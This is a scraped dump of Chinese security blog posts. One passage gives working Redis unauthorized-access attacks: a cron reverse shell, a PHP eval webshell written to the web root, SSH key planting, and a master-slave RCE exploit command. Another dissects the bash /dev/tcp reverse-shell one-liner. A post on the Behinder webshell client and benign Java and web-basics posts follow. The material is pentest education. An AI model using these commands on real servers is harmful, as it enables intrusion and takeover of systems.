1234567891011再次科普下：m:分钟 - 从0到59的整数h:小时 - 从0到23的整数dom:天 - 从1到31的整数 (必须是指定月份的有效日期)mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份)dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)user:指的是执行命令的用户command: 需要执行的命令星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务 12345ubuntu下可以利用的cron有以下几个地方：/etc/crontab：该文件里面的任务计划可以直接执行/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计 登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向/etc/cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。 – 我们手动把乱码删除，发现依然无法成功反弹shell。这是为什么呢？ 通过视频资料发现ubantu下默认使用/bin/dash执行脚本的问题，解决方式:将shell环境修改为bash。 成功反弹shell 扩展思路 利用Redis未授权访问写定时任务反弹shell 利用Redis未授权访问写webshell 通过redis未授权访问漏洞向ubuntu的web跟目录下写入一个webshell，然后要知道网站的根目录，在该测试环境下网站的根目录为/var/www/html 1234set xx &quot;\\n\\n\\&lt;?php @eval($_POST[&apos;test&apos;]);?&gt;\\n\\n&quot;config set dir /var/www/htmlconfig set dbfilename shell.phpsave 利用redis未授权访问向远程服务器写入ssh公钥 12345678910111213在本地生成一对密钥：$ ssh-keygen -t rsa然后将公钥写入 key.txt 文件$ (echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt之后利用redis未授权访问漏洞将公钥写到/root/.ssh/id_rsa文件中$ cat key.txt | redis-cli -h ip -x set crackit接下来在redis-cli的交互式shell下执行config set dir /root/.sshconfig get dirconfig set dbfilename &quot;authorized_keys&quot;save这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行$ ssh –i id_rsa root@ip Redis 基于主从复制的RCE利用方式 https://lorexxar.cn/2019/07/10/redis-5-x-rce/ 什么是Redis主从复制 Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 漏洞利用 下载Exp git clone https://github.com/Ridter/redis-rce.git 下载 exp.so 下载后放到 redis-rce 目录下 wget –no-chck-certificate https://github.com/n0b0dyCN/redis-rogue-server/raw/master/exp.so 利用 此处可以通过 -p 去设置目标端口（默认6379） python redis-rce.py -r &lt;目标IP&gt; -L &lt;监听的公网IP&gt; -P &lt;监听的公网端口&gt; -f exp.so 利用redis未授权访问远程命令执行 https://github.com/vkbiu/CVE/tree/master/redis-rce 参考链接 https://www.ixigua.com/i6590668394092036612/#mid=1568076190183425 https://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"深入理解bash反弹shell命令","slug":"渗透测试-深入理解bash反弹shell命令","date":"2019-05-20T07:30:08.000Z","updated":"2019-10-11T10:39:53.461Z","comments":true,"path":"2019/05/20/渗透测试-深入理解bash反弹shell命令/","link":"","permalink":"http://www.vkxss.top/2019/05/20/渗透测试-深入理解bash反弹shell命令/","excerpt":"","text":"0x00 首先了解下shell 0x01 bash反弹shell 0x001 关于-i 0x002 关于&gt;&amp; 0x003 关于0&gt;&amp;1 0x004 关于 /dev/tcp/host/port 0x00 首先了解下shell Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。 以下是几种shell版本，bash是默认的： sh(全称 Bourne Shell): 是UNIX最初使用的 shell，而且在每种 UNIX 上都可以使用。Bourne Shell 在 shell 编程方面相当优秀，但在处理与用户的交互方面做得不如其他几种 shell。bash（全称 Bourne Again Shell）: LinuxOS 默认的，它是 Bourne Shell 的扩展。与 Bourne Shell 完全兼容，并且在 Bourne Shell 的基础上增加了很多特性。可以提供命令补全，命令编辑和命令历史等功能。它还包含了很多 C Shell 和 Korn Shell 中的优点，有灵活和强大的编辑接口，同时又很友好的用户界面。 csh(全称 C Shell): 是一种比 Bourne Shell更适合的变种 Shell，它的语法与 C 语言很相似。Tcsh: 是 Linux 提供的 C Shell 的一个扩展版本。Tcsh 包括命令行编辑，可编程单词补全，拼写校正，历史命令替换，作业控制和类似 C 语言的语法，他不仅和 Bash Shell 提示符兼容，而且还提供比 Bash Shell 更多的提示符参数。ksh (全称 Korn Shell): 集合了 C Shell 和 Bourne Shell 的优点并且和 Bourne Shell 完全兼容。pdksh: 是 Linux 系统提供的 ksh 的扩展。pdksh 支持人物控制，可以在命令行上挂起，后台执行，唤醒或终止程序。 0x01 bash反弹shell 对于bash反弹shell这条命令，相信很多人都很熟悉了: 1/bin/bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1 但是这里面的每个细节是否都清楚了，这可就不一定了 0x001 关于-i 12root@kali:~# man bash | grep -E &quot;\\-i&quot; -i If the -i option is present, the shell is interactive. 首先 -i 是交互的模式，但是发现其实不用-i参数也是可以的，因为bash就是处理用户交互的 0x002 关于&gt;&amp; 1234567891011121314151617181920212223242526272829303132root@kali:~# man bash | grep &quot;Redirecting Standard Output and Standard Error&quot; -A 30 Redirecting Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be redirected to the file whose name is the expansion of word. There are two formats for redirecting standard output and standard error: &amp;&gt;word and &gt;&amp;word Of the two forms, the first is preferred. This is semantically equiva‐ lent to &gt;word 2&gt;&amp;1 When using the second form, word may not expand to a number or -. If it does, other redirection operators apply (see Duplicating File Descriptors below) for compatibility reasons. Appending Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be appended to the file whose name is the expansion of word. The format for appending standard output and standard error is: &amp;&gt;&gt;word This is semantically equivalent to 看bash的文档，可以看到，这个是将标准输出和标准错误都重定向了跟 &gt;word 2&gt;&amp;1 的效果是一致的 当然我们用 &amp;&gt; 也是可以的 0x003 关于0&gt;&amp;1 0&gt;1是将标准输入重定向到文件名为1的文件，不存在就创建所以为了区别，那就在1前面加个&amp;来表示标准输出。 0&gt;&amp;1 0x004 关于 /dev/tcp/host/port 我们知道linux一切皆文件，但是其实这个文件肯定是不存在的 我们可以从man文档中看到 1234567root@kali:~# man bash | grep &quot;/dev/tcp&quot; -A 5 /dev/tcp/host/port If host is a valid hostname or Internet address, and port is an integer port number or service name, bash attempts to open the corresponding TCP socket. /dev/udp/host/port If host is a valid hostname or Internet address, and port 那么这个是在主机名、ip地址以及端口有效的情况，会打开一个TCP的套接字，连接对应主机的对应端口","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.vkxss.top/categories/Linux/"}],"tags":[{"name":"反弹Shell","slug":"反弹Shell","permalink":"http://www.vkxss.top/tags/反弹Shell/"}]},{"title":"工具-冰蝎客户端篇","slug":"工具-冰蝎客户端篇","date":"2019-05-10T13:02:30.000Z","updated":"2020-05-19T05:09:07.979Z","comments":true,"path":"2019/05/10/工具-冰蝎客户端篇/","link":"","permalink":"http://www.vkxss.top/2019/05/10/工具-冰蝎客户端篇/","excerpt":"","text":"工具使用 FAQ 1. 基本信息 2. 文件管理 3. 命令执行 4. 虚拟终端 5. Socks代理 6.反弹Shell 7.数据库管理 8.自定义代码 9.备忘录 工具使用 转 https://github.com/rebeyond/Behinder FAQ Mac系统下好像打不开？ Mac系统下需要通过-XstartOnFirstThread参数启动，java -XstartOnFirstThread -jar Behinder.jar。 1. 基本信息 客户端和服务端握手之后，会获取服务器的基本信息，Java、.NET版本包括环境变量、系统属性等，PHP版本会显示phpinfo的内容。 2. 文件管理 这个没什么好说的，无非是文件的增删改查，稍微不同的是上传的文件都是加密传输的，可以避免被拦截。 3. 命令执行 执行单条操作系统命令。 4. 虚拟终端 虚拟终端是模拟了一个真实的交互式Shell环境，相当于把服务器侧的Shell给搬到了客户端，在这个Shell里可以执行各种需要交互式的命令，如ssh、mysql。比如说：我们可以在这个Shell里去ssh连接服务器侧内网的其他主机，可以参考下面这个动图： 当然，如果你习惯powershell，也可以弹个powershell出来，如下图： 5. Socks代理 虚拟终端功能其实就已经部分实现了内网穿透的能力，在Shell环境里做的所有事情都是在内网环境中的。不过为了方便使用其他工具，客户端还提供了基于一句话木马的Socks代理功能，一键开启，简单高效，可以参考如下动图： 顺便说一下，代理过程中所有的流量都是在socks的基础上封装了一层AES。 6.反弹Shell 反弹Shell是突破防火墙的利器，也几乎是后渗透过程的必备步骤。提到后渗透，当然少不了metasploit，提到metasploit，当然少不了meterpreter，所以冰蝎客户端提供了两种反弹Shell的方式，常规Shell和Meterpreter，实现和metasploit的一键无缝对接。请参考如下动图： 上图演示的是Meterpreter，当然常规的Shell也可以对接metasploit，就不演示了。 7.数据库管理 常规功能，实现了数据库的可视化管理，放张截图吧： 和常规管理工具不同的是，在Java和.NET环境中，当目标机器中没有对应数据库的驱动时，会自动上传并加载数据库驱动。比如目标程序用的是MySQL的数据，但是内网有另外一台Oracle，此时就会自动上传并加载Oracle对应的驱动。 8.自定义代码 可以在服务端执行任意的Java、PHP、C#代码，这也是个常规功能，值得一提的是我们输入的代码都是加密传输的，所以不用为了躲避waf而用各种编码变形，效果请参考如下动图： 9.备忘录 渗透的时候总有很多零碎的信息需要记录，所以针对每个Shell提供了一个备忘录的功能，目前只支持纯文本，粘贴进去自动保存：","categories":[{"name":"安全工具","slug":"安全工具","permalink":"http://www.vkxss.top/categories/安全工具/"}],"tags":[]},{"title":"绕CDN，网站真实IP记录","slug":"渗透测试-绕CDN，网站真实IP记录","date":"2019-04-18T04:25:40.000Z","updated":"2020-03-22T16:14:15.583Z","comments":true,"path":"2019/04/18/渗透测试-绕CDN，网站真实IP记录/","link":"","permalink":"http://www.vkxss.top/2019/04/18/渗透测试-绕CDN，网站真实IP记录/","excerpt":"","text":"### 0x01 绕CDN，验证是否存在CDN方法1 超级 ping ，查看对应 IP 地址是否唯一，如果不唯一大概率使用了CDN， ping一个站，响应多个IP，肯定用了CDN，多地 Ping 网站有很多，如下，根据响应包判断是否存在CDN 123http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/ 方法2 nslookup 进行检测，如果返回域名解析对应多个 IP 地址大概率使用了 CDN。 比如：&gt; www.163.com 服务器: public1.114dns.com Address: 114.114.114.114 非权威应答: 名称: 163.xdwscache.ourglb0.com Addresses: 58.223.164.86 125.75.32.252 Aliases: www.163.com www.163.com.lxdns.com 在比如： 无 CDN 的示例：&gt; je2se.com 服务器: public1.114dns.com Address: 114.114.114.114 非权威应答: 名称: je2se.com Address: 192.168.1.1 方法3 还有使用各种工具帮助检测目标网站是否使用了CDN， 比如： http://www.cdnplanet.com/tools/cdnfinder/ http://www.ipip.net/ip.html 绕过CDN查找网站真实IP 查询历史DNS记录 查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录， 比如： https://dnsdb.io/zh-cn/ https://x.threatbook.cn/ http://toolbar.netcraft.com/site_report?url= http://viewdns.info/ 查询子域名 很多站长也许只会对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过子域名查询对应的 IP 来辅助查找网站的真实IP。 利用网站漏洞 /滑稽 ，利用漏洞目标服务器主动来连接我们，这样就能知道真实IP，比如XSS盲打，命令执行反弹shell，SSRF等等。 服务器合法服务主动连接我们 一样的思路就是让服务器主动连接我们告诉我们它的IP，不过使用的是合法的服务，如RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。 使用国外主机解析域名 国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。 目标敏感文件泄露 也许目标服务器上存在一些泄露的敏感文件中会告诉我们网站的IP，另外就是如 phpinfo之类的探针了。 从 CDN 入手 无论是用社工还是其他手段，反正是拿到了目标网站管理员在CDN的账号了，此时就可以自己在CDN的配置中找到网站的真实IP了。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"基础知识-使用IDEA开发遇到的问题","slug":"基础知识-Java-使用IDEA开发遇到的问题","date":"2019-03-02T12:08:08.000Z","updated":"2020-04-24T12:17:58.126Z","comments":true,"path":"2019/03/02/基础知识-Java-使用IDEA开发遇到的问题/","link":"","permalink":"http://www.vkxss.top/2019/03/02/基础知识-Java-使用IDEA开发遇到的问题/","excerpt":"","text":"Debug 步骤 一、解决IDEA右键 new 没有新建class/Interface等等选项 二、IntelliJ Idea如何快捷生成getter和setter方法 方法/步骤 三、IDEA 快速生成 equals()/hashCode() 方法体 四、IDEA自动生成Getter、Setter、toString等的方法 Debug 步骤 一、解决IDEA右键 new 没有新建class/Interface等等选项 1.File-&gt;Project Structure 2.选择Modules–&gt;右边Sources中选择所需目录 然后点击 Sources–&gt;Apply–&gt;OK 3.再在左侧的的Project中选择需要创建的目录里面右击就出现了java class–&gt; 4.点击Java Class –&gt;在弹出的窗口中选择所需类型然后输入名称点击 Ok即可 二、IntelliJ Idea如何快捷生成getter和setter方法方法/步骤 首先创建出你的实体类,或者准备好你要生成getter和setter方法的属性 然后再空白处点击右键,会出现这个界面,然后点Generate 接着会跳出这个界面,选getter and setter 接着会跳出一个选属性的界面,这里就要把你需要生成getter和setter的属性选上,按住command键,直接点一下最后一个属性即可全部选中，然后点击下方的ok。 getter和setter方法就会从你光标所在位置插入进去了,所以光标最好停留在类的末尾处 三、IDEA 快速生成 equals()/hashCode() 方法体 在代码区域，右键选择 Generate，或按 alt + insert； 选择对应方法； 四、IDEA自动生成Getter、Setter、toString等的方法","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"http://www.vkxss.top/tags/基础知识/"}]},{"title":"基础知识-Java-Mac版_IntelliJ_IDEA_创建Web项目","slug":"基础知识-Java-Mac版-IntelliJ-IDEA-创建Web项目","date":"2019-03-01T06:10:40.000Z","updated":"2020-04-21T12:03:48.388Z","comments":true,"path":"2019/03/01/基础知识-Java-Mac版-IntelliJ-IDEA-创建Web项目/","link":"","permalink":"http://www.vkxss.top/2019/03/01/基础知识-Java-Mac版-IntelliJ-IDEA-创建Web项目/","excerpt":"","text":"创建一个web项目 创建一个Module 新建完成的web项目 在web/WEB-INF下创建两个文件夹：classes和lib 配置文件夹路径 配置Tomcat容器 在Tomcat中部署并运行项目 编辑index.jsp文件 Servlet简单实现 部署servlet 创建一个web项目 File -&gt; New Project -&gt; 选择Project SDK为1.8 -&gt; Next 新建一个web项目 在Project name中输入项目名称“Demos” ，Project location选择项目要存放的位置，可以默认 -&gt;Finish 输入项目名称 创建一个Module 鼠标点中项目名称demos -&gt; 右键选择New，选择Module 新建一个Module 勾选Web Application-&gt; 确认已勾选Create web.xml 勾选Web Application 输入Module名称firstweb-&gt; 点击Finish 输入Module名称 新建完成的web项目 新建完web项目后的提示 新建完成后的目录结构 在web/WEB-INF下创建两个文件夹：classes和lib classes用来存放编译后输出的class文件，lib用于存放第三方jar包。 配置文件夹路径 File -&gt; Project Structure(快捷键：cmd + ;) -&gt; 选择Module ：选择Paths -&gt; 选择Use module compile output path -&gt; 将Output path和Test output path都选择刚刚创建的classes文件夹。 接着选择Dependencies -&gt; 将Module SDK选择为1.8 -&gt; 点击下面的“+”号 -&gt; 选择1 Jars or Directories 选择刚刚创建的lib文件夹 选择jar directory -&gt; 接着返回一路OK就行了~~ 配置Tomcat容器 打开菜单Run -&gt; 选择Edit Configuration 点击“+”号 -&gt; 选择Tomcat Server -&gt; 选择Local 点击Application server后面的Configure…，弹出Tomcat Server窗口，选择本地安装的Tomcat目录 -&gt; OK 在Run/Debug Configurations窗口的Server选项板中，取消勾选After launch，设置HTTP port和JMX port（默认值即可），点击 Apply -&gt; OK， 至此Tomcat配置完成。 在Tomcat中部署并运行项目 Run -&gt;Edit Configurations，进入Run/Debug Configurations窗口 -&gt; 选择刚刚建立的Tomcat容器 -&gt; 选择Deployment -&gt; 点击下面的“+”号 -&gt; 选择Artifact 选择web项目 -&gt;Application context可以填/hello(其实也可以不填的~~) -&gt; OK 编辑index.jsp文件1234567891011121314151617&lt;%-- Created by IntelliJ IDEA. User: guoyanjun Date: 2017/5/26 Time: 下午2:59 To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;这是第一个web项目&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;hello world&lt;/p&gt; &lt;p&gt;第一个项目运行成功啦！&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 运行Tomcat,在浏览器中查看运行结果 Servlet简单实现 编写servlet源文件 在src目录下新建HelloWorld.Java，并编写一下代码并进行编译： 123456789101112131415161718192021222324252627282930/** * Created by guoyanjun on 2017/5/26. */import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;public class HelloWorld extends HttpServlet &#123; private String message; @Override public void init()throws ServletException &#123; message = &quot;Hello World, This message is from Servlet!&quot;; &#125; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //设置响应内容类型 resp.setContentType(&quot;text/html&quot;); //设置逻辑实现 PrintWriter out = resp.getWriter(); out.println(&quot;&lt;h3&gt;&quot; + message + &quot;&lt;/h3&gt;&quot;); &#125; @Override public void destroy() &#123; super.destroy(); &#125;&#125; 编译后会发现在classes目录下生成了HelloWorld.class文件 IDEA创建servlet时找不到import javax.servlet…相关类包的问题 12345import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession; - 会提示你，程序包javax.servlet和程序包javax.servlet.http不存在的错误原因在于Java编译器没有找到软件包javax.servelt - 解决的方法：把tomcat安装包里的lib目录下的servlet-api.jar拷贝一份到工程文件夹下的web目录下的WEB-INF目录下lib子文件下的,即 web—&gt;WEB-INF–lib ![](./基础知识-Java-Mac版-IntelliJ-IDEA-创建Web项目/15874701407240.jpg)部署servlet 方法一：在WEB-INF目录下web.xml文件的标签中添加如下内容： 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; version=&quot;3.1&quot;&gt; &lt;servlet&gt; &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt; &lt;servlet-class&gt;HelloWorld&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt; &lt;url-pattern&gt;/HelloWorld&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 方法二：在HelloWorld文件的类前面加上@WebServlet(“/HelloWorld”) 运行servlet 点击运行按钮 运行成功 控制台出现successfully则tomcat服务启动成功！打开浏览器输入：localhost:8080/hello/HelloWorld即可查看servlet运行状态了。","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"http://www.vkxss.top/tags/基础知识/"}]},{"title":"工具-Burp插件_reCAPTCHA","slug":"工具-Burp插件-reCAPTCHA","date":"2019-02-28T13:57:15.000Z","updated":"2020-05-19T05:09:02.537Z","comments":true,"path":"2019/02/28/工具-Burp插件-reCAPTCHA/","link":"","permalink":"http://www.vkxss.top/2019/02/28/工具-Burp插件-reCAPTCHA/","excerpt":"","text":"0x01 简介 0x02 使用 0x01 简介一个burp插件，自动识别图形验证码，并用于Intruder中的Payload。 0x02 使用 安装： 从这里下载插件。 将它添加到burp。如果没有遇到错误，你将看到一个新的名为“reCAPTCHA”的tab。 抓取验证码URL-send to reCAPTCHA 通过云平台识别成功 在Intruder中使用： payload 1我们从文件中加载： payload 2 选择Extension-Generated","categories":[{"name":"安全工具","slug":"安全工具","permalink":"http://www.vkxss.top/categories/安全工具/"}],"tags":[]},{"title":"Jar第三方组件漏洞检查工具","slug":"Jar第三方组件漏洞检查工具","date":"2019-02-22T07:30:08.000Z","updated":"2019-12-15T15:34:13.656Z","comments":true,"path":"2019/02/22/Jar第三方组件漏洞检查工具/","link":"","permalink":"http://www.vkxss.top/2019/02/22/Jar第三方组件漏洞检查工具/","excerpt":"","text":"0x00 工具介绍 dependency-check是一款根据项目依赖来检查漏洞的白盒审计工具。他根据项目中的依赖库，搜集依赖的版本，厂商等信息，然后匹配NVD漏洞库，对比其中的CPE来确定此版本的依赖包是否存在漏洞。他虽然最主要是用来检查java项目的依赖，但是对于js,c/c++,python，它也是具有一定的检查能力。 它支持多种使用方式，各有优缺点。无论是jar包，还是目录，或者压缩文件，他都能自动识别。 0x01 安装与运行 Dependency Check官网：https://www.owasp.org/index.php/OWASP_Dependency_Check Dependency Check官方文档：https://jeremylong.github.io/DependencyCheck/index.html Dependency Check有三种使用方式： 从命令行使用：此时Dependency Check作为一个单独的软件，与项目无关，使用时只需指定需要扫描的项目位置即可。在业务上线流程中推荐使用此方式 作为插件在项目中使用：此时需要在项目的配置文件中做相关内容添加，只对当前项目有效。别的项目需要使用时，需要重新修改配置文件 作为Ant Task使用：这种方式的使用介于以上两者之间，可以在多个项目中使用，但是需要安装，并且需要在项目的build.xml中添加相关配置。 下载使用说明： 从命令行使用时Dependency Check作为一个单独的软件，需要从官网下载。 官网右侧Quick Download目录下选择Command Line即可。 下载后解压即可使用。 如果是windows平台，运行bin目录下dependency-check.bat； 如果是linux，运行dependency-check.sh； 如果是mac平台，使用brew install dependency-check即可安装。 注意：第一次扫描的时候会需要等待很长时间。因为Dependency Check需要将从NVD下载数据库，则可能需要花十分钟甚至二十分钟。在这之后，只要两次扫描的间隔时间不超过七天，就只需要维护一个很小的xml列表，它会在每次启动扫描的时候自动更新，大约只需要一分钟左右。 如何使用： windows使用: dependency-check.bat –project “My App Name” –scan “c:\\java\\application\\lib” 参数说明： project用于指定这个扫描项目的名字（不是要扫描的项目，而是扫描这个任务的项目名字，可以随便指定） scan指定要扫描的压缩文件或者目录。Linux平台类似，只是把.bat换成.sh。第一次使用会很慢，因为要下载相应的NVD库。","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"什么是AJAX","slug":"前端安全-什么是AJAX","date":"2019-02-07T07:30:08.000Z","updated":"2019-10-15T05:18:40.231Z","comments":true,"path":"2019/02/07/前端安全-什么是AJAX/","link":"","permalink":"http://www.vkxss.top/2019/02/07/前端安全-什么是AJAX/","excerpt":"","text":"一、什么是Ajax? AJAX全称为“Asynchronous JavaScript and XML”(异步JavaScript和XML),是一种创建交互式网页应用的网页开发技术 Ajax是一种技术方案，但并不是一种新技术。它依赖现有的CSS/HTML/JavaScript，而其中最核心的依赖是浏览器提供的XMLHttpRequest对象，是这个对象使得浏览器可以发出HTTP请求与接收HTTP响应。实现了在页面不刷新个情况下和服务器进行数据交互。 这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。 二、如何实现Ajax？ (1)创建XMLHttpRequest对象,也就是创建一个异步调用对象. (2)创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息. (3)设置响应HTTP请求状态变化的函数. (4)发送HTTP请求. (5)获取异步调用返回的数据. (6)使用JavaScript和DOM实现局部刷新. 0x01 Demo user.json 1234&#123; &quot;name&quot;:&quot;VK&quot;, &quot;age&quot;:&quot;25&quot;&#125; ajax.html 0x02 演示 网站A获取网站B的用户数据： 网站A：http://vkduang.com/AJAX/ajax.html 网站B：http://vkkuayu.com:8000/user.json 你会发现console报出了如下的错误; 很明显请求是受到同源策略的限制。 0x03 哪些资源是默认可以跨域的 上面定义提到了”受限制”, 也就是说不是所有的跨域资源需要CORS机制。 思考🤔","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://www.vkxss.top/categories/前端安全/"}],"tags":[{"name":"前端知识","slug":"前端知识","permalink":"http://www.vkxss.top/tags/前端知识/"}]},{"title":"理解同源策略总结","slug":"前端安全-理解同源策略总结","date":"2019-02-06T07:30:08.000Z","updated":"2020-02-08T16:45:46.952Z","comments":true,"path":"2019/02/06/前端安全-理解同源策略总结/","link":"","permalink":"http://www.vkxss.top/2019/02/06/前端安全-理解同源策略总结/","excerpt":"","text":"0x01 背景 0x02 首先说说为什么存在同源策略 0x03 举个例子 0x04 同源策略的限制范围 0x05 允许跨域加载的三个标签 0x06 绕过跨域 0x07 sop无法防御csrf 0x08 SOP 与 ajax 0x01 背景 当我们可能观察到了不少网站的一些接口信息。发现浏览器为了保证用户隐私以及其它因素考虑，对于网络接口的调用有一层屏障，这层屏障称为同源策略。那么今天我们就来学习下这个同源策略，希望能提升大家对于接口的测试和利用水平。 0x02 首先说说为什么存在同源策略 我们知道JavaScript可以操作html，可以发出请求，也可以用iframe加载别的网站。那么试想一下，你登陆了一个购物网站比如某宝，接着去访问了VK’Blog。如果VK’Blog利用JavaScript给某宝的收货地址url发起了请求，从原则上讲，这个请求不会成功，否则你的隐私就泄露了。那么控制这个请求的成功与否，就叫同源策略。 总之，同源策略的规定可以概括成：不同域的客户端脚本在没明确授权的情况下，不能读写对方的资源。 0x03 举个例子 假设有以下页面，比较 A 页面与其它页面是否同源～ 12345A：http://vk.com/a.html B：http://vk.com/b.html C：https://vk.com /c.html D：http://test.vk.com/d.html E：http://vk.com:8081/e.html 根据定义，可以知道 A 和 B 同源，而 A 和 C、D、E 不同源。A、B 页面同源是因为其协议（都是 http）、域名（都是 xys.ttsy）和端口（都是 80）都相同；而 A 与 C、D、E 不同源，是因为 A 和 C 不同协议（http 和 https），A 和 D 不同域名（vk.com 和 test.vk.com），A 和 E 不同端口（80 和 8081） 。 注意 同源策略要求三同, 即: 同域, 同协议, 同端口. 同域即host相同, 顶级域名, 一级域名, 二级域名, 三级域名等必须相同, 且域名不能与 ip 对应; 顶级域名：.cn 一级域名：vk.cn 二级域名：www.vk.cn 三级域名：xxx.www.vk.cn 同协议要求, http与https协议必须保持一致; 同端口要求, 端口号必须相同. IE有些例外, 它仅仅只是验证主机名以及访问协议，而忽略了端口号. 这里需要澄清一个概念, 所谓的域, 跟 js 等资源的存放服务器没有关系, 比如你到 baidu.com 使用 script 标签请求了 google.com 下的js, 那么该 js 所在域是 baidu.com, 而不是 google.com. 换言之, 它能操作baidu.com的页面对象, 却不能操作google.com的页面对象. 0x04 同源策略的限制范围 同源策略下的web世界, 域的壁垒高筑, 从而保证各个网页相互独立, 互相之间不能直接访问, iframe, ajax 等均受其限制, 但是有三个标签是允许跨域加载资源的。 Iframe限制 可以访问同域资源, 可读写; 访问跨域页面时, 只读. Ajax限制 Ajax 的限制比 iframe 限制更严. 同域资源可读写; 跨域请求会直接被浏览器拦截.(chrome下跨域请求不会发起, 其他浏览器一般是可发送跨域请求, 但响应被浏览器拦截) Cookie限制 只有同源的网页才能共享 但是，两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置document.domain共享 Cookie。 举例来说，A网页是http://w1.example.com/a.html，B网页是http://w2.example.com/b.html，那么只要设置相同的document.domain，两个网页就可以共享Cookie。 document.domain = ‘example.com’;现在，A网页通过脚本设置一个 Cookie。document.cookie = “test1=hello”; B网页就可以读到这个 Cookie。var allCookie = document.cookie; 注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexDB 无法通过这种方法，规避同源政策，而要使用下文介绍的PostMessage API。 另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如.example.com。 Set-Cookie: key=value; domain=.example.com; path=/ 这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。 所以Cookie中的同源只关注域名，忽略协议和端口。所以https://localhost:8080/和http://localhost:8081/的Cookie是共享的。 LocalStorage、IndexDB等存储性内容 DOM节点 0x05 